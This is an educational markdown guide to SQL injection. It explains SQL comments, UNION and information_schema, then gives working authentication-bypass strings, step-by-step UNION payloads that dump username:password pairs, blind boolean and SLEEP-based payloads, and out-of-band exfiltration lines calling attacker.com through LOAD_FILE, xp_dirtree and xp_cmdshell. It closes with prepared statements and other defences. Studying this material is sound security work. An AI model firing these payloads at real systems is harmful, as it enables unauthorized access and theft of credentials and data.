# SQL Injection (SQLi)

> OWASP A03:2021 / A05:2025 - Injection

---

# Introduction

SQL Injection (SQLi) is one of the most dangerous web application vulnerabilities.

It occurs when an application inserts user-controlled input directly into an SQL query without proper sanitization or parameterized queries.

Instead of treating user input as **data**, the database interprets it as **SQL commands**.

An attacker can:

- Read sensitive data
- Bypass authentication
- Modify records
- Delete data
- Execute administrative database operations
- Sometimes gain full control of the database server

Despite being one of the oldest web vulnerabilities, SQLi is still found in modern applications and is responsible for many large-scale data breaches.

---

# How SQL Injection Works

Normal query:

```sql
SELECT * FROM users
WHERE username='admin'
AND password='password123';
```

Server-side vulnerable code:

```php
$query = "SELECT * FROM users WHERE id=" . $_GET['id'];
```

If an attacker supplies:

```
?id=1 OR 1=1--
```

The query becomes:

```sql
SELECT * FROM users
WHERE id=1 OR 1=1--
AND public=1;
```

Because:

```
1=1 → Always TRUE
```

Everything after `--` becomes a comment.

Result:

- Password checks skipped
- Authorization bypassed
- Entire database rows returned

---

# SQL Essentials for Injection

Understanding these SQL concepts makes SQLi much easier.

---

## SQL Comments

Used to ignore the remaining part of a query.

### MySQL Comments

```sql
--
#
/* */
```

Example:

Original query:

```sql
SELECT *
FROM users
WHERE username='INPUT'
AND password='secret';
```

Input:

```
admin'--
```

Final query:

```sql
SELECT *
FROM users
WHERE username='admin'--
AND password='secret';
```

Password verification never executes.

---

## UNION Operator

Combines results from multiple SELECT statements.

Example:

```sql
SELECT name, age
FROM students

UNION

SELECT username, id
FROM admins;
```

Requirements:

- Same number of columns
- Compatible data types

Purpose in SQLi:

Extract data from other tables.

---

## LIKE Operator

Used for pattern matching.

Wildcards:

```
%
```

Matches any number of characters.

```
_
```

Matches exactly one character.

Example:

```sql
SELECT *
FROM users
WHERE username LIKE 'adm%';
```

Returns:

- admin
- administrator
- admin123

Used heavily in Blind SQLi.

---

## LIMIT

Controls returned rows.

Examples:

```sql
LIMIT 1
```

Returns first row.

```sql
LIMIT 2,1
```

Skips first two rows and returns the third.

Useful for:

- Enumerating rows
- Reducing output

---

## CONCAT()

Joins values.

Example:

```sql
SELECT CONCAT(username,':',password)
FROM users;
```

Output:

```
admin:pass123
```

---

## GROUP_CONCAT()

Returns multiple rows as one string.

Example:

```sql
SELECT GROUP_CONCAT(username,':',password)
FROM users;
```

Output:

```
admin:pass123,martin:secret,john:test
```

Useful during UNION SQLi.

---

## information_schema

A built-in database containing metadata.

Think of it as the database map.

Useful tables:

### information_schema.tables

Contains:

- Database names
- Table names

Columns:

```
table_schema
table_name
```

---

### information_schema.columns

Contains:

- Column names
- Data types

Columns:

```
table_name
column_name
```

Attackers use it to enumerate database structure.

---

# Types of SQL Injection

SQL Injection has three main categories.

```
SQL Injection
│
├── In-Band
│     ├── Error-Based
│     └── Union-Based
│
├── Blind
│     ├── Authentication Bypass
│     ├── Boolean-Based
│     └── Time-Based
│
└── Out-of-Band
```

---

# Detecting SQL Injection

Common injection points:

- URL Parameters
- Login Forms
- Search Boxes
- Cookies
- HTTP Headers
- POST Data

Basic tests:

Single quote

```
'
```

Double quote

```
"
```

Comment

```
;--
```

Boolean condition

```
OR 1=1
```

If:

- Errors appear
- Results change
- Timing changes

The application may be vulnerable.

---

# In-Band SQL Injection

The injected query and extracted data travel through the same HTTP response.

Most common type.

---

## Error-Based SQL Injection

Uses database error messages.

Example payload:

```
'
```

Possible error:

```
You have an error in your SQL syntax...
```

Reveals:

- Database type
- Query structure
- Quote usage
- Table information

---

## Union-Based SQL Injection

Uses UNION SELECT to append attacker-controlled queries.

---

### Step 1 — Find Number of Columns

```sql
1 UNION SELECT 1
```

```sql
1 UNION SELECT 1,2
```

```sql
1 UNION SELECT 1,2,3
```

Continue until errors disappear.

---

### Step 2 — Find Visible Columns

```sql
0 UNION SELECT 1,2,3
```

Numbers appearing on the webpage indicate visible columns.

---

### Step 3 — Find Current Database

```sql
0 UNION SELECT 1,2,database()
```

---

### Step 4 — Enumerate Tables

```sql
0 UNION
SELECT
1,
2,
GROUP_CONCAT(table_name)
FROM information_schema.tables
WHERE table_schema='database_name';
```

---

### Step 5 — Enumerate Columns

```sql
0 UNION
SELECT
1,
2,
GROUP_CONCAT(column_name)
FROM information_schema.columns
WHERE table_name='users';
```

---

### Step 6 — Dump Data

```sql
0 UNION
SELECT
1,
2,
GROUP_CONCAT(username,':',password)
FROM users;
```

---

# Blind SQL Injection

Application does not display:

- Query results
- Database errors

Attacker infers information indirectly.

---

## Authentication Bypass

Normal query:

```sql
SELECT *
FROM users
WHERE username='bob'
AND password='secret';
```

Payload:

```
' OR 1=1--
```

Query becomes:

```sql
SELECT *
FROM users
WHERE username=''
OR 1=1--
AND password='anything';
```

Result:

- Password ignored
- First user returned
- Login successful

---

### Login as Specific User

Payload:

```
admin'--
```

Query:

```sql
SELECT *
FROM users
WHERE username='admin'--
AND password='anything';
```

Logs in as admin.

---

# Boolean-Based Blind SQLi

Application only returns:

- True
- False

Example:

```
{"taken":true}
```

or

```
{"taken":false}
```

---

### Confirm Injection

```sql
admin123'
UNION SELECT
1,2,3
WHERE database()
LIKE '%';--
```

Returns TRUE.

---

### Guess Database Name

```sql
LIKE 'a%'
```

```sql
LIKE 'b%'
```

```sql
LIKE 'c%'
```

Continue until response becomes TRUE.

Repeat for:

- Tables
- Columns
- Usernames
- Passwords

---

# Time-Based Blind SQLi

No visible difference.

Uses response delay.

MySQL function:

```sql
SLEEP(5)
```

Example:

```sql
admin123'
UNION
SELECT
SLEEP(5),2
WHERE database()
LIKE 's%';--
```

If response pauses:

Database starts with "s".

Otherwise:

Condition FALSE.

---

### MSSQL Equivalent

```sql
WAITFOR DELAY '0:0:5'
```

---

# Boolean vs Time-Based

| Scenario | Technique |
|----------|-----------|
| Different responses | Boolean-Based |
| Same responses | Time-Based |
| Timing blocked | Out-of-Band |

---

# Out-of-Band SQL Injection

Used when:

- No errors
- No page differences
- No timing differences

Database sends data externally.

Usually via:

- DNS
- HTTP

---

## DNS Exfiltration (MySQL)

```sql
SELECT LOAD_FILE(
CONCAT(
'\\\\',
(SELECT database()),
'.attacker.com\\share'
)
);
```

DNS request:

```
webapp_db.attacker.com
```

Attacker extracts:

```
webapp_db
```

---

## MSSQL Techniques

### xp_dirtree

```sql
EXEC master..xp_dirtree '\\attacker.com\share';
```

Triggers DNS lookup.

---

### xp_cmdshell

```sql
EXEC xp_cmdshell
'nslookup data.attacker.com';
```

Executes system commands.

---

## Receiving Data

Common tools:

- Burp Collaborator
- Interactsh
- Custom DNS Server
- Custom HTTP Server

---

## Limitations

Requires:

- Outbound network access
- Database-specific payloads

DNS also has:

- 63-character label limit

Less reliable than In-Band SQLi.

---

# SQL Injection Prevention

---

## 1. Prepared Statements (Best Practice)

Never concatenate user input.

Bad:

```php
$query="SELECT * FROM users WHERE username='".$_POST['username']."'";
```

Good:

```php
$stmt=$pdo->prepare(
"SELECT * FROM users WHERE username=?"
);

$stmt->execute([
$_POST['username']
]);
```

User input cannot alter SQL syntax.

---

## Python Example

Bad:

```python
query=f"SELECT * FROM users WHERE username='{username}'"
```

Good:

```python
cursor.execute(
"SELECT * FROM users WHERE username=%s",
(username,)
)
```

---

## 2. Input Validation

Allow only expected input.

Example:

```php
ctype_digit($_GET['id'])
```

Accept:

```
123
```

Reject:

```
1 OR 1=1
```

Use:

✔ Allowlisting

Avoid:

❌ Blacklisting

---

## 3. Escaping

Escapes special characters.

Example:

```
'
```

becomes

```
\'
```

Useful only for legacy applications.

Prepared statements remain the proper solution.

---

## 4. Principle of Least Privilege

Application accounts should have minimal permissions.

Example:

Read-only application:

```
SELECT
```

Should NOT have:

- DROP
- DELETE
- CREATE
- ALTER

Never use:

- root
- sa

---

## 5. Web Application Firewall (WAF)

Detects common payloads:

```
UNION SELECT
```

```
OR 1=1
```

```
information_schema
```

Provides:

- Detection
- Blocking

Does **NOT** replace secure coding.

---

# SQL Injection Workflow

```
Find Input

      │

      ▼

Test '

      │

      ▼

Error?

      │

      ├── Yes → Error-Based SQLi

      │

      └── No

             │

             ▼

Test UNION

             │

             ▼

Data Visible?

             │

      ├── Yes → Union-Based

      │

      └── No

             │

             ▼

Test Boolean

             │

      ├── Works → Boolean Blind

      │

      └── No

             │

             ▼

Test SLEEP()

             │

      ├── Delay → Time-Based

      │

      └── No

             │

             ▼

Try Out-of-Band
```

---

# Key Takeaways

- SQL Injection manipulates SQL queries using user input.
- Comments (`--`, `#`, `/* */`) terminate unwanted SQL.
- UNION SQLi extracts data directly.
- Error-Based SQLi leaks database information.
- Blind SQLi relies on application behavior.
- Boolean-Based uses True/False responses.
- Time-Based uses delays with `SLEEP()`.
- Out-of-Band uses DNS/HTTP callbacks.
- `information_schema` reveals tables and columns.
- Prepared Statements completely prevent SQL Injection.
- Least Privilege minimizes impact if SQLi occurs.
